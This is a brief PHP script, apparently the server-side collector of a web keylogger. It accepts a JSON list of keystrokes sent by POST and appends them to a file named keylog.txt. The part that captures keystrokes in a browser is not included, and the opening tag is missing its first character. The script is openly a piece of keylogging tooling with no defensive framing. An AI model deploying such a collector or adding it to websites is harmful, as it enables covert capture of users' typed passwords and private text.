?php
// (A) OPEN KEYLOG FILE, APPEND MODE
$file = fopen("keylog.txt", "a+");

// (B) SAVE KEYSTROKES
$keys = json_decode($_POST["keys"]);
foreach ($keys as $k=>$v) { fwrite($file, $v . PHP_EOL); }

// (C) CLOSE & END
fclose($file);
echo "OK";